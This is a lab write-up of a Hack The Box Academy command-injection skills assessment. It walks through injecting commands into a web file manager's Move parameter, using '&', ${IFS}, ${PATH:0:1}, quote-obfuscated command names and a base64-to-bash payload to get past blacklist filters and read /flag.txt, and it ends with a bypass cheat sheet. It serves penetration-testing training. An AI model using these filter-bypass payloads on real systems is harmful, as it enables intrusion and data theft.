# Command Injections — Skills Assessment

| Field | Details |
|-------|---------|
| Module | 22 — Command Injections |
| Type | Skills Assessment |
| Difficulty | Medium |
| OS | Linux (Apache + PHP) |
| Target | `10.129.43.173:54788` |
| Attacker | `10.10.16.36` |
| Date | September 2026 |

---

## Attack Chain Summary

| Step | Technique | Outcome |
|------|-----------|--------|
| 1 | Login with `guest:guest` — enumerate web file manager features | `Copy to...` and `Move` buttons identified as OS command candidates |
| 2 | Click `Move` with no destination — observe error output | Error confirms back-end `mv` command — output channel confirmed |
| 3 | Burp intercept — test injection operators in `to` and `from` parameters | `;`, `\n`, `\|`, `&&`, `\|\|` all return `Malicious request denied!` |
| 4 | Test `&` operator — passes through unfiltered | `&` (`%26`) is whitelisted — injection point confirmed |
| 5 | Test space and slash bypass — `${IFS}` and `${PATH:0:1}` | Both work cleanly — filtered characters bypassed |
| 6 | Inject `%26c"a"t${IFS}${PATH:0:1}flag.txt` in `to` parameter | Flag read from `/flag.txt` |

---

## Network Topology

```
[Attack Host: 10.10.16.36]
        ↓ Browser + Burp Suite (FoxyProxy → BURP on 127.0.0.1:8080)
[Target: 10.129.43.173:54788]
  └── /index.php                     ← Web file manager (login: guest:guest)
  └── /index.php?to=&from=&finish=1  ← Move/Copy endpoint — OS command injection
       mv <from> <to>                 ← Back-end shell command
```

---

## Question 1 — Read the Contents of `/flag.txt`

**Question:** "What is the content of '/flag.txt'?"

---

### Step 1 — Login and Enumerate the Application

Navigate to `http://10.129.43.173:54788` and log in with:

```
Username: guest
Password: guest
```

The application is a **web-based file manager**. After logging in, a file listing is visible with several files and one folder. Each file has four action buttons:

| Button | Description | OS Command Potential |
|--------|-------------|---------------------|
| `Preview` | Displays file content | Low — likely reads file internally |
| `Copy to...` | Copies file to a destination | Medium — may call `cp` |
| `Direct link` | Generates a download URL | Low — likely URL generation |
| `Download` | Downloads the file | Low — likely file serving |
| `Move` | Moves file to a destination | **High — almost certainly calls `mv`** |

The **Move** functionality is the strongest candidate. OS `mv` commands take two arguments (`source` and `destination`) — both of which would be user-controlled. Any user input that directly populates a shell command argument is a command injection candidate.

---

### Step 2 — Confirm the Back-End Uses `mv` via Error Message

Click the **Move** button on any file without selecting a destination folder. The application displays:

```
mv: missing destination file operand after '/path/to/source_file'
```

This error reveals two critical facts:
1. The back-end is literally calling the Linux `mv` command
2. **The error output from `mv` is passed directly back to the HTTP response** — this gives us an output channel for our injected commands

> **Key insight:** For the injection to produce visible output, the original `mv` command must **fail** (so the error is triggered and our injected command output appears alongside it). An injection operator that executes our command regardless of the first command's success/failure is needed — ruling out `&&` (requires first to succeed) and `||` (requires first to fail).

The operators `&`, `|`, `;`, and `\n` all execute the second command regardless of the first. We will test which of these is permitted.

---

### Step 3 — Intercept the Move Request in Burp Suite

Activate the **BURP** profile in FoxyProxy. Click **Move** on a file (without selecting a destination) to generate the request. Burp intercepts:

```http
GET /index.php?to=&from=51459716.txt&finish=1&move=1 HTTP/1.1
Host: 10.129.43.173:54788
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0)
Accept: */*
Cookie: PHPSESSID=<session>
```

Two GET parameters control the shell command:
- `to` — destination path (where the file is moved to)
- `from` — source filename

The back-end constructs and executes: `mv <from> <to>`

Send this request to **Repeater** (`CTRL+R`).

---

### Step 4 — Identify the Allowed Injection Operator

In Burp Repeater, test each injection operator one at a time in the `to` parameter:

**Test `;` (semicolon):**

```http
GET /index.php?to=tmp%3Bwhoami&from=51459716.txt&finish=1&move=1 HTTP/1.1
Host: 10.129.43.173:54788
```

```
Malicious request denied!
```

**Test `\n` (newline `%0a`):**

```http
GET /index.php?to=tmp%0awhoami&from=51459716.txt&finish=1&move=1 HTTP/1.1
Host: 10.129.43.173:54788
```

```
Malicious request denied!
```

**Test `|` (pipe `%7c`):**

```http
GET /index.php?to=tmp%7cwhoami&from=51459716.txt&finish=1&move=1 HTTP/1.1
Host: 10.129.43.173:54788
```

```
Malicious request denied!
```

**Test `&&` (`%26%26`):**

```http
GET /index.php?to=tmp%26%26whoami&from=51459716.txt&finish=1&move=1 HTTP/1.1
Host: 10.129.43.173:54788
```

```
Malicious request denied!
```

**Test `&` (`%26` — single ampersand):**

```http
GET /index.php?to=tmp%26whoami&from=51459716.txt&finish=1&move=1 HTTP/1.1
Host: 10.129.43.173:54788
```

```
mv: missing destination file operand after '51459716.txt'
www-data
```

The `&` operator passes through undetected. The developers likely whitelisted `&` because it is a standard URL parameter separator — but in bash, a single `&` runs a command in the background and shows its output. The `mv` command fails (no destination), the error appears, and then `whoami` executes and returns `www-data`.

> **Injection point confirmed:** `to` parameter accepts `&` (`%26`) as an injection operator.

---

### Step 5 — Identify Filtered Characters

Test with a space in the command:

```http
GET /index.php?to=tmp%26cat+/flag.txt&from=51459716.txt&finish=1&move=1 HTTP/1.1
Host: 10.129.43.173:54788
```

```
Malicious request denied!
```

Space triggers the filter. Test `${IFS}` to replace the space:

```http
GET /index.php?to=tmp%26cat${IFS}/flag.txt&from=51459716.txt&finish=1&move=1 HTTP/1.1
Host: 10.129.43.173:54788
```

```
Malicious request denied!
```

Still denied. Narrow down which character is blocked:

**Test without the slash:**

```http
GET /index.php?to=tmp%26cat${IFS}flag.txt&from=51459716.txt&finish=1&move=1 HTTP/1.1
Host: 10.129.43.173:54788
```

```
mv: missing destination file operand after '51459716.txt'
cat: flag.txt: No such file or directory
```

`${IFS}` accepted — the slash `/` is filtered. Test `${PATH:0:1}` to produce `/`:

```http
GET /index.php?to=tmp%26cat${IFS}${PATH:0:1}flag.txt&from=51459716.txt&finish=1&move=1 HTTP/1.1
Host: 10.129.43.173:54788
```

```
Malicious request denied!
```

The word `cat` itself is now triggering the filter. Apply quote obfuscation to bypass the command blacklist.

**Filter bypass summary:**

| Filtered Character | Bypass Used | Result |
|-------------------|-------------|--------|
| `;` `\|` `&&` `\|\|` `\n` | `&` (`%26`) | ✅ Passes |
| Space ` ` | `${IFS}` | ✅ Passes |
| Slash `/` | `${PATH:0:1}` | ✅ Passes |
| Word `cat` | `c"a"t` | To test |

---

### Step 6 — Bypass Command Blacklist and Retrieve Flag

Obfuscate `cat` by inserting quotes that bash ignores:

```
c"a"t   →   executes as cat, but string does not match blacklist word "cat"
```

**Method 1 — Quote Obfuscation:**

```http
GET /index.php?to=tmp$IFS%26c"a"t$IFS${PATH:0:1}flag.txt&from=51459716.txt&finish=1&move=1 HTTP/1.1
Host: 10.129.43.173:54788
Cookie: PHPSESSID=<session>
```

**Response:**

```
mv: missing destination file operand after '51459716.txt'
HTB{flag_redacted}
```

The `mv` command fails as expected (no valid destination), and our obfuscated `cat /flag.txt` executes via the `&` injection operator.

---

### Alternative Method — Base64 Encoded Command

A second method that avoids all filtered characters by base64-encoding the entire command:

```bash
Hackerpatel007_1@htb[/htb]$ echo -n 'cat /flag.txt' | base64
Y2F0IC9mbGFnLnR4dA==
```

**Method 2 — Base64 Encoding:**

```http
GET /index.php?to=tmp$IFS%26b"a"sh<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)&from=51459716.txt&finish=1&move=1 HTTP/1.1
Host: 10.129.43.173:54788
Cookie: PHPSESSID=<session>
```

**How this payload works:**
- `b"a"sh` — obfuscated `bash` bypassing command blacklist
- `<<<` — here-string redirects input to bash (avoids pipe `|` which may be filtered)
- `$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)` — decodes base64 to `cat /flag.txt` inside a sub-shell
- `%09` — tab character replaces the space between `base64` and `-d`

**Response:**

```
mv: missing destination file operand after '51459716.txt'
HTB{flag_redacted}
```

Identical result via both methods.

> **Flag:** `HTB{flag_redacted}`

---

## Attack Chain Summary

```
http://10.129.43.173:54788 → login: guest:guest
        ↓
Web file manager → Move button on a file
→ Error: "mv: missing destination file operand after '51459716.txt'"
→ Confirms: mv command, error output displayed, two injectable parameters (to, from)
        ↓
Burp intercept → Repeater
GET /index.php?to=&from=51459716.txt&finish=1&move=1
        ↓
Test injection operators in `to` parameter:
;   → Malicious request denied
%0a → Malicious request denied
|   → Malicious request denied
&&  → Malicious request denied
&   (%26) → PASSES → www-data returned ← injection point confirmed
        ↓
Test character filters:
space → blocked → bypass: ${IFS} ✓
slash (/) → blocked → bypass: ${PATH:0:1} ✓
cat → blocked → bypass: c"a"t ✓ (quote insertion)
        ↓
Method 1 — Quote obfuscation:
?to=tmp$IFS%26c"a"t$IFS${PATH:0:1}flag.txt&from=51459716.txt&finish=1&move=1
→ HTB{flag_redacted}

Method 2 — Base64 encoding:
echo -n 'cat /flag.txt' | base64 → Y2F0IC9mbGFnLnR4dA==
?to=tmp$IFS%26b"a"sh<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)&from=51459716.txt&finish=1&move=1
→ HTB{flag_redacted}
```

---

## Lessons Learned

- **File manager operations (Move, Copy, Rename) are prime command injection surfaces.** Any web feature that moves, copies, or renames files on the server almost certainly calls an OS command — `mv`, `cp`, `rename`. Both the source and destination paths are attacker-controlled, providing two injection points per operation.

- **Error messages are an output channel.** When `mv` fails, it prints the error to stderr — and when the web application passes that error back to the HTTP response, any injected command that runs after `mv` has its output displayed alongside the error.

- **Developers whitelist `&` because it is a URL separator — then forget it is also a bash operator.** A single `&` in bash runs the preceding command in the background and then executes what follows. Security filters that block `;`, `|`, `&&`, `||`, and `\n` but allow `&` leave a working injection operator in place.

- **`${IFS}` is the most reliable space bypass on Linux.** The Internal Field Separator environment variable always contains whitespace. It is universally available and cannot be blacklisted without breaking bash itself.

- **`${PATH:0:1}` produces `/` from the environment without using the slash character.** `$PATH` always starts with `/`, so extracting the first character via bash substring notation always yields `/`.

- **Command blacklists check exact string matches — quote insertion defeats them.** Inserting `"a"` into the middle of `cat` produces `c"a"t` — bash strips the quotes during execution and runs `cat` normally, but the blacklist never sees the word `cat` in the input.

- **Base64 encoding provides a universal filter bypass.** When the base64-encoded string is decoded in a sub-shell and executed via `bash<<<`, the actual command never appears in the HTTP request. Replace `|` with `<<<` and space with `%09` to produce a filter-safe execution chain.

---

## Filter Bypass Quick Reference

| Filtered Character | Bypass Used | Explanation |
|-------------------|-------------|-------------|
| `;` `\|` `&&` `\|\|` `\n` | `&` (`%26`) | Whitelisted by developers as URL parameter separator |
| Space ` ` | `${IFS}` | Bash IFS variable always contains whitespace |
| Slash `/` | `${PATH:0:1}` | First character of $PATH is always `/` |
| Word `cat` | `c"a"t` | Quote insertion — bash strips quotes, blacklist doesn't match |
| Word `bash` | `b"a"sh` | Same quote insertion technique |
| Pipe `\|` in base64 cmd | `<<<` here-string | Redirects string to bash without using pipe character |
| Space in `base64 -d` | `%09` tab | Tab character replaces space between command and flag |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1190 | — | Exploit Public-Facing Application — command injection via `to` parameter in web file manager |
| T1059 | T1059.004 | Command and Scripting Interpreter: Unix Shell — bash command execution via `mv` injection |
| T1027 | T1027.001 | Obfuscated Files or Information — quote insertion (`c"a"t`), `${IFS}`, `${PATH:0:1}`, base64 encoding |
| T1562 | T1562.001 | Impair Defences: Disable or Modify Tools — bypassing character and command blacklist filters |
| T1083 | — | File and Directory Discovery — directory listing via injected commands |
| T1005 | — | Data from Local System — `/flag.txt` read via obfuscated `cat` command through injection |

---

*Part of the HTB Academy CPTS path — Command Injections module.*  
*Penetration Tester role in India | Target: January 2027*
